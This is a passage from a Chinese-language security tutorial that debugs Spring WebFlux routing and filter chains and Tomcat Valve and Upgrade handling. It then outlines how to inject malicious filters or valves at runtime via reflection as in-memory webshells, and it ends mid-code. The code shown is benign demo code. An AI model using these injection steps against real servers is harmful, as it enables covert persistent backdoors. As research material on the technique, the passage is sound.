![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG1p8F7QZESrnL6mLMu5qafTa66EMibmN8PiaOm35iaQRCVLVl21NZ9JXvg/640?wx_fmt=png&from=appmsg)

解释上面代码中的`return`部分，首先检查`handlerMappings`是否为`null`，如果是，那就调用`createNotFoundError`方法返回一个表示未找到处理程序的`Mono`；接着通过`CorsUtils.isPreFlightRequest`方法检查是否为预检请求，如果是，那就调用`handlePreFlight`方法处理预检请求，如果不是预检请求且`handlerMappings`不为`null`，通过一系列的操作，获取到请求的`handler`，然后调用`invokeHandler`方法执行处理程序，再调用`handleResult`方法处理执行结果，最终返回一个表示处理完成的`Mono`。

左下角的`Threads & Variables`这里，我们往下翻，可以看到在此之前是调用了一个`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGpYga9Do7ddVL4pscliao8vEVgNgXxRM9azoXrzYqIfA8s3jXgZoFlaQ/640?wx_fmt=png&from=appmsg)

我们把之前的断点去掉，然后在该函数这里打上断点：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGmnNric9Amk0l6tNicbabrhlViantPbs5fEtboyj6A0M1PFHE45c0ZcTNw/640?wx_fmt=png&from=appmsg)

发现调用了`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal`，我们再回去看，发现调用位置在`org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGEmic4DEiaKH4YUU3M1TLXH5LVtiahEyUzSUibfuEuZkeGbTibrCaibJpabBA/640?wx_fmt=png&from=appmsg)

点击去：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGlmFno5VIKuwBkEaOZPTLiacYCzr6m6uAdtubuaZZRzNx8BQMslnb2PA/640?wx_fmt=png&from=appmsg)

这里最终创建的是`DefaultServerRequest`对象，需要注意的是在创建该对象时将`RouterFunctionMapping`中保存的`HttpMessageReader`列表作为参数传入，这样`DefaultServerRequest`对象就有了解析参数的能力。

回到`getHandlerInternal`这个函数，看它的`return`里面的匿名函数，发现其调用了`org.springframework.web.reactive.function.server.RouterFunction#route`，我们点进去看看：

发现只是在接口中定义了下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGXbrJKU6VhLB9fibDyZJ5rLQjD24XmpU3xDFoTqcZiceUjLc2TjoVRr3g/640?wx_fmt=png&from=appmsg)

于是去翻之前的`Threads & Variables`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGHjmlicMeWoEO4hnZWtibOxgq0ia5R9yBYPIearptlJrXTrDFEBNX1Krmg/640?wx_fmt=png&from=appmsg)

首先调用`this.predicate.test`方法来判断传入的`ServerRequest`是否符合路由要求，如果匹配到了处理方法，那就将保存的`HandlerFunction`实现返回，否则就返回空的`Mono`。

点进去这个`test`方法，发现还是个接口，结合之前的`RouterFunction.java`和`RouterFunctions.java`的命名规则，合理猜测`test`方法的实现应该是在`RequestPredicates.java`里面。果然是有的，我们取消之前下的所有断点，在`test`函数这里重新打上断点后调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG8hg8B3paiaIJAsFOIDaLs81dFEGtEDlbpic97EkNiaGthe9FSlUKJwdUg/640?wx_fmt=png&from=appmsg)

可以看到这里已经拿到了`pattern`，那就还差解析`request`里面的`GET`这个方法了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGB8lW2H6kticibCZXNOF67e9d1YfJ9DvEv50Bsk09md9wXOD2ByoA1QwQ/640?wx_fmt=png&from=appmsg)

我们继续`step over`，发现直接跳到了这里，我当时就挺纳闷儿，这里的`this.left`和`this.right`怎么就已知了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGNlGZuNh7mJASJnpZib4GLJKKrOy3RsUwDOjiaKux9eAe5rpvWEDibNGMg/640?wx_fmt=png&from=appmsg)

这俩变量已知说明在执行`test`之前肯定是已经被赋值了，我继续往后`step over`，从下图中可以看到，此时二者之间多了个`&&`，不难猜测，应该是调用了`org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate`方法，因为还有一个`OrRequestPredicate`，这个`or`的话应该就是`||`了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGFhsDaYF9uURDj3Y8iahOlj6VfXZ2tmcS4VucsEUjV7qpQAmnGvDXmrg/640?wx_fmt=png&from=appmsg)

于是我们再在`AndRequestPredicate`方法这打上断点，此时我们还没有访问`http://127.0.0.1:9191/hello`，就已经触发调试了，这是因为我们在`GreetingRouter.java`里面写的代码中有`GET`方法、`/hello`路由还有`and`方法，因此会调用到`AndRequestPredicate`，并把`GET`和`/hello`分别复制给`this.left`和`this.right`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwaAAcvF0fqWqgIicM6IFuXFwR6yMYS11d5qbiaL1WekzXQKKdTe60iawQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGGRiaANbcHMWH1lr4vibVIG8h6r7DInAvCMW15dYEPvPmMYBdnrRYe2hA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGFulqPVl2EoIUpyqBaKHicNOOibcyuFGYWCLkDB1cDISKY0hnSQkC94KA/640?wx_fmt=png&from=appmsg)

到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们`2.12.3`节中的分析中已经基本涉及到了。我们还是在`org.springframework.web.reactive.DispatcherHandler#invokeHandler`打下断点调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGzMe5WP2nIq6VJnTDnZJFiaDicXxekb6tBT64TUl7TAkPhm5Pk3dPydeg/640?wx_fmt=png&from=appmsg)

可以看到，这里的`this.handlerAdapters`里面有四个`handlerAdapter`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGYQ5qdqFb0fH01eJciag04qptmXXhsLGmDticFB68B2qYSxsWhCWdQjcw/640?wx_fmt=png&from=appmsg)

并不是所有的`handlerAdapter`都会触发`handle`方法，只有当支持我们给定的`handler`的`handlerAdapter`才可以调用：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGISh7ZBfqMsm0hqxdbMtFQU1k7MCblqyDzd90dxwtOYAS6BzLZ1X1pw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGHIwv42YhmYhAWdglhdB25SVq7TAmI5l6NQznfia7CmDjAPNMeK118mg/640?wx_fmt=png&from=appmsg)

然后我们`step into`这里的`handlerAdapter.handle`方法，发现是在`org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG3BdrrQbLnTO0hrAzxuwUVr3lj5SghkE1Q1mSHPdw2IVA5ibiaWjWk0Ow/640?wx_fmt=png&from=appmsg)

而这里的`handlerFunction.handle`也就是我们编写的`route`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGO5iaILLHLHRMIrZ6SzdV6Dtd5LUKVYY3LgcnY422rcpnGFPicGrp65WQ/640?wx_fmt=png&from=appmsg)

到这里，关于处理请求的部分也就完结了。

### 2.12.5 Spring WebFlux 过滤器 WebFilter 运行过程分析

对于`Spring WebFlux`而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用`Filter`，关于这一部分知识可以参考 Spring 的官方文档：

> https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html

而在`Spring Webflux`中，存在两种类型的过滤器：一个是`WebFilter`，实现自`org.springframework.web.server.WebFilter`接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到`handler`之前或者之后执行一些逻辑；另一个就是`HandlerFilterFunction`，它是一种函数式编程的过滤器类型，实现自`org.springframework.web.reactive.function.server.HandlerFilterFunction`接口，与`WebFilter`相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。

这里我们以`WebFilter`为例，看看它的运行过程。新建一个`GreetingFilter.java`，代码如下：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;
import reactor.core.publisher.Mono;

@Component
public class GreetingFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
        PathPattern pattern=new PathPatternParser().parse("/hello/**");
        ServerHttpRequest request=serverWebExchange.getRequest();
        if (pattern.matches(request.getPath().pathWithinApplication())){
            System.out.println("hello, this is our filter!");
        }
        return webFilterChain.filter(serverWebExchange);
    }
}


```

效果如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGp7XjzPiaOKIv9JGicahncaUbJic3mLNbNaySYn5icSccQHW45Ir0e5YibUw/640?wx_fmt=png&from=appmsg)

我们直接在`filter`函数这里下断点，进行调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGcs2VUiayPRKFE1RHlYBIKPicTESq2I0rCJzVlViagWicO5av5lvUkMYaHg/640?wx_fmt=png&from=appmsg)

注意到`return`中调用了`filter`函数，于是`step into`看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGMGCNP1nv5c0pqpEG8eW1icOwfEIBBhpZ3AAeeQ3TOrvjKEibicxyFTKEw/640?wx_fmt=png&from=appmsg)

可以看到是调用了`invokeFilter`函数。我们仔细看看这个`DefaultWebFilterChain`类：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGiaHl2vNvglZylQPV83qHbZlCBILfcZ3VdgicG21OG7ficq1FnE0PDh22A/640?wx_fmt=png&from=appmsg)

可以看到是有三个名为`DefaultWebFilterChain`的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建`chain`的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话：

> Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link.
> 
> ![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGibiboJWdamVzFl67EQfupKtuSqfxcic1yZiaBvALhkAQOnicBOWFCqjBDtw/640?wx_fmt=png&from=appmsg)

也就是说，通过调用 `DefaultWebFilterChain` 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个`link`，而不是一个`chain`，这就意味着我们无法通过修改下图中的`chain.allFilters`来实现新增`Filter`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGcxDouOmUdYqcs6L16GtUlhiabHokyib4fbXuZCuQvChPXxFlBP6S0icCw/640?wx_fmt=png&from=appmsg)

但是这个类里面有个`initChain`方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGTLibL4iaibzQOOULnibAP6aucUohLQGAQyKWEYC5ubZ59cN6Y4Xa0SUbxg/640?wx_fmt=png&from=appmsg)

那我们就看看这个公共构造方法是在哪里调用的：

光标移至该方法，按两下`Ctrl+Alt+F7`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGeYRNRuczW6VhbzWEFib36zfiaPc6x7Dz6d5C637QF5JLSv07ibiaoiaPOTw/640?wx_fmt=png&from=appmsg)

调用的地方位于`org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGFsV1QGRvQVt8IFTJC3beddVc2gPMkfu6V8S4kGsxxjoKiaBWjvxVlUg/640?wx_fmt=png&from=appmsg)

那思路就来了，我们只需要构造一个`DefaultWebFilterChain`对象，，然后把它通过反射写入到`FilteringWebHandler`类对象的`chain`属性中就可以了。

那现在就剩下传入`handler`和`filters`这两个参数了，这个`handler`参数很好搞，就在`chain`里面：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGOGR29FLViaA2FyNT7ic2TveJkEbiaUib5ORek0qqwuRms786MQU02nCyWg/640?wx_fmt=png&from=appmsg)

然后这个`filters`的话，我们可以先获取到它本来的`filters`，然后把我们自己写的恶意`filter`放进去，放到第一位，就可以了。

那现在就是从内存中找到`DefaultWebFilterChain`的位置，然后一步步反射就行。这里直接使用工具`https://github.com/c0ny1/java-object-searcher`，克隆下来该项目，放到`idea`中`mvn clean install`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGoBYdOxdOM318EEBeqGAsMb0zV0PV8XPPBBRGjpbLJGhIsM7JCibEKbA/640?wx_fmt=png&from=appmsg)image-20240126134339217

然后把生成的这个`java-object-searcher-0.1.0.jar`放到我们的`WebFluxMemoryShellDemo`项目的 Project `Structure`中的`Libraries`中：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGo3eia5bf5ib2C0W0u8TlmibNBeqqjFwQaSp8qJRPNwbc1Ont7lRIAeAyQ/640?wx_fmt=png&from=appmsg)

然后我们把我们的`GreetingFilter.java`的代码修改成下面的：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;
import reactor.core.publisher.Mono;

import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import java.util.ArrayList;
import java.util.List;

@Component
public class GreetingFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
        PathPattern pattern=new PathPatternParser().parse("/hello/**");
        ServerHttpRequest request=serverWebExchange.getRequest();
        if (pattern.matches(request.getPath().pathWithinApplication())){
            System.out.println("hello, this is our GreetingFilter!");
        }
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("DefaultWebFilterChain").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
        searcher.searchObject();
        return webFilterChain.filter(serverWebExchange);
    }
}


```

这里我们设置的关键字是`DefaultWebFilterChain`，然后直接运行：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGIicsib89bbPHryibia4iaOZ4c8pRVfAicT3RgsloeaQTeqFicBVLQlydWSPXQ/640?wx_fmt=png&from=appmsg)

也就是说，位置是在：

```
TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
     ---> this$0 = {org.springframework.boot.web.embedded.netty.NettyWebServer} 
      ---> handler = {org.springframework.http.server.reactive.ReactorHttpHandlerAdapter} 
       ---> httpHandler = {org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler} 
        ---> delegate = {org.springframework.web.server.adapter.HttpWebHandlerAdapter} 
         ---> delegate = {org.springframework.web.server.handler.ExceptionHandlingWebHandler} 
           ---> delegate = {org.springframework.web.server.handler.FilteringWebHandler} 
            ---> chain = {org.springframework.web.server.handler.DefaultWebFilterChain}


```

2.13 Tomcat Valve 介绍与运行过程分析
---------------------------

### 2.13.1 Valve 与 Pipeline

在众多文章里面，下面的这篇我觉得是讲的最通俗易懂的，这里推荐给大家：

> https://www.cnblogs.com/coldridgeValley/p/5816414.html

这里我组合引用原文，做了适当的修改，概括一下：

`tomcat`中的`Container`有 4 种，分别是`Engine`、`Host`、`Context`和`Wrapper`，这`4`个`Container`的实现类分别是`StandardEngine`、`StandardHost`、`StandardContext`和`StandardWrapper`。`4`种容器的关系是包含关系，`Engine`包含`Host`，`Host`包含`Context`，`Context`包含`Wrapper`，`Wrapper`则代表最基础的一个`Servlet`。`tomcat`由`Connector`和`Container`两部分组成，而当网络请求过来的时候`Connector`先将请求包装为`Request`，然后将`Request`交由`Container`进行处理，最终返回给请求方。而`Container`处理的第一层就是`Engine`容器，但是在`tomcat`中`Engine`容器不会直接调用`Host`容器去处理请求，那么请求是怎么在`4`个容器中流转的，4 个容器之间是怎么依次调用的呢？

原来，当请求到达`Engine`容器的时候，`Engine`并非是直接调用对应的`Host`去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做`pipeline`组件，跟`pipeline`相关的还有个也是容器内部的组件，叫做`valve`组件。

`Pipeline`的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么`pipeline`就可以理解为不同容器之间的管道，道路，桥梁。那`Valve`这个组件是什么东西呢？`Valve`也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，`Pipeline`和`Valve`关系也是一样的。`Valve`代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把`Pipeline`比作公路的话，那么`Valve`可以理解为公路上的收费站，车代表`Pipeline`中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。

在`Catalina`中，`4`种容器都有自己的`Pipeline`组件，每个`Pipeline`组件上至少会设定一个`Valve`，这个`Valve`我们称之为`BaseValve`，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。

`Pipeline`定义对应的接口`Pipeline`，标准实现了`StandardPipeline`。`Valve`定义对应的接口`Valve`，抽象实现类`ValveBase`，`4`个容器对应基础阀门分别是`StandardEngineValve`，`StandardHostValve`，`StandardContextValve`，`StandardWrapperValve`。在实际运行中，`Pipeline`和`Valve`运行机制如下图：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGKFicRlvrSMLediaiaYRUqalP3jib2ZibXvTfSQBlYoel3w8IaslExyrBiaxA/640?wx_fmt=png&from=appmsg)

这张图是新加坡的`Dennis Jacob`在`ApacheCON Asia 2022`上的演讲《Extending Valves in Tomcat》中的`PPT`中的图片，`pdf`链接如下：

> https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf

这篇演讲的录屏在`Youtube`上面可以找到：

> https://www.youtube.com/watch?v=Jmw-d0kyZ_4

### 2.13.2 编写一个简单 Tomcat Valve 的 demo

由于在`Tomcat`环境下使用 Valve 还要配置 web.xml，我嫌麻烦，于是直接使用`SpringBoot`来搭建。记得这里勾选的是`Spring Web`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGfvgickeRFlh1c38NdY1XjdRfoGZibNklG5ycJK6eYhnxyvLmYcTNdYxw/640?wx_fmt=png&from=appmsg)

然后创建`test`目录并在`test`目录下创建两个文件，`TestValve.java`：

```
package org.example.valvememoryshelldemo.test;

import java.io.IOException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;
import org.springframework.stereotype.Component;

@Component
public class TestValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException {
        response.setContentType("text/plain");
        response.setCharacterEncoding("UTF-8");
        response.getWriter().write("Valve 被成功调用");
    }
}


```

还有`TestConfig.java`：

```
package org.example.valvememoryshelldemo.test;

import org.apache.catalina.Valve;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class TestConfig {
    @Bean
    public WebServerFactoryCustomizer<TomcatServletWebServerFactory> tomcatCustomizer() {
        return factory -> {
            factory.addContextValves(getTestValve());
        };
    }
    
    @Bean
    public Valve getTestValve() {
        return new TestValve();
    }
}


```

运行效果如下：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGIUpUhB0YRsMmnqUU3dCwsTT3z4EL7hBvg2SaB94C12kRjJ4GmCLIEw/640?wx_fmt=png&from=appmsg)

### 2.13.3 Tomcat Valve 打入内存马思路分析

我们通常情况下用的都是`ValveBase`，点进这个`ValveBase`，可以看到是实现了`Valve`接口：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG3qm0MZT81OVlBcbX6B7kSfdapmIxWxbcCSaRzHk1LRfJPibKVx7M96A/640?wx_fmt=png&from=appmsg)

点进`valve`可以看到该接口代码如下，这里我加上了注释：

```
package org.apache.catalina;

import java.io.IOException;
import javax.servlet.ServletException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

public interface Valve {
    // 获取下一个阀门
    public Valve getNext();
    // 设置下一个阀门
    public void setNext(Valve valve);
    // 后台执行逻辑，主要在类加载上下文中使用到
    public void backgroundProcess();
    // 执行业务逻辑
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
    // 是否异步执行
    public boolean isAsyncSupported();
}


```

接下来就是调试看看这个`valve`的运行流程了，我们在`invoke`函数这里下断点调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGHsgtZERZZC212FaGMHQDSVnfNDg28NicDxkp6PSlBO2wfo03UxiaNs0A/640?wx_fmt=png&from=appmsg)

我们看向左下角，看看之前调用到的`invoke`方法：

在`StandardHostValve.java`中，代码为：

```
context.getPipeline().getFirst().invoke(request, response);


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGL4Q8Gpk6ySmvriaiaj7iadZdCIMpKbt29Y08THKWQGibulu4qZbubEAUTg/640?wx_fmt=png&from=appmsg)

在`StandardEngineValve.java`中，代码为：

```
host.getPipeline().getFirst().invoke(request, response);


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGexOVWKUHtYsiahs8BX5Hqqu7D9yNqlia7dTbjAoJVC8EspcmXI0qXVUw/640?wx_fmt=png&from=appmsg)

之后的诸如`Http11Processor.java`和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的`Tomcat Servlet/Filter/Listener`内存马的思路来看，我们需要通过某种方式添加我们自己的恶意`valve`。

我们去掉之前打的断点，在`StandardHostValve.java`这里打上断电并重新调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwEhHIMiaEjngdI3GphETwekoBuDuBbIjTL2t5qlWyA9ul5BWzg1SXeQ/640?wx_fmt=png&from=appmsg)

然后`step into`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGxkx7KJtvsZfBZqsZ9LickCknoBkjlNkY3F9mZdLHXTkHvcbaFKPqKJQ/640?wx_fmt=png&from=appmsg)

鼠标左键单击这里的`getPipeline`即可进入到所调用的函数实现的位置：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGCIz5EFNiabehtSiaa3S8ldiapA5XSZ84vicoG5d9I3NS35xch3icaAQvuDw/640?wx_fmt=png&from=appmsg)

再`Ctrl+H`进入`Pipeline`接口，可以看到是有个`addValve`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGEHbRraRyLfwS4SZkeNIBGYVibK1ic0urEbIxibBWVadQ6JwwEicgShDjXQ/640?wx_fmt=png&from=appmsg)

这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在`addValve`函数处`Ctrl+H`找继承该接口的类，可可以看到是在`org.apache.catalina.core.StandardPipeline`中：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGniaLgNKU8fw73GYmcooYUicFca3HTDygs1y20zVV5kxrKBqXFh9kVtAA/640?wx_fmt=png&from=appmsg)image-20240130155445230

但是问题就来了，我们无法直接获取到这个`StandardPipeline`，而我们能直接获取到的是`StandardContext`，那就去看看`StandardContext.java`中有没有获取`StandardPipeline`的方法。

一眼就能看到我们的老熟人——`getPipeline`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGYYybibaSib7FkltPSkDH3ZUxiczMxSwKbBDZ4okNm9vtbeDia1pLZI1BibQ/640?wx_fmt=png&from=appmsg)

那这样以来我们的思路就可以补充完整了，先反射获取`StandardContext`，然后编写一个恶意`Valve`，最后通过`StandardContext.getPipeline().addValve()`添加就可以了。当然，我们也可以反射获取`StandardPipeline`，然后再`addValve`，这样也是可以的。

2.14 Tomcat Upgrade 介绍与打入内存马思路分析
--------------------------------

### 2.14.1 编写一个简单的 Tomcat Upgrade 的 demo

#### 2.14.1.1 利用 SpringBoot 搭建

我这里在之前的`Tomcat Valve`项目的基础上做了简单的修改，删除之前`test`目录下的`TestValve.java`，新建一个`TestUpgrade.java`：

```
package org.example.valvememoryshelldemo.test;

import org.apache.coyote.*;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import org.springframework.context.annotation.Configuration;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@Configuration
public class TestUpgrade implements UpgradeProtocol {
    @Override
    public String getHttpUpgradeName(boolean b) {
        return "hello";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, Request request) {
        return null;
    }

    public boolean accept(org.apache.coyote.Request request) {

        try {
            Field response = org.apache.coyote.Request.class.getDeclaredField("response");
            response.setAccessible(true);
            Response resp = (Response) response.get(request);
            resp.doWrite(ByteBuffer.wrap("\n\nHello, this my test Upgrade!\n\n".getBytes()));
        } catch (Exception ignored) {}
        return false;
    }
}


```

然后修改`TestConfig.java`如下：

```
package org.example.valvememoryshelldemo.test;

import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.stereotype.Component;

@Component
public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {

    @Override
    public void customize(TomcatServletWebServerFactory factory) {
        factory.addConnectorCustomizers(connector -> {
            connector.addUpgradeProtocol(new TestUpgrade());
        });
    }
}


```

运行之后命令行执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`，效果如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGp17OPtaG6X009ZRcX3BqxtVVGtLwWEMGOhLCXqvSbic9UyLicttYooFw/640?wx_fmt=png&from=appmsg)

#### 2.14.1.2 利用 Tomcat 搭建

当然也是可以利用`Tomcat`来搭建的，只需要`TestUpgrade.java`即可，因为里面含有定义的`servlet`逻辑：

```
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Request;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.Response;
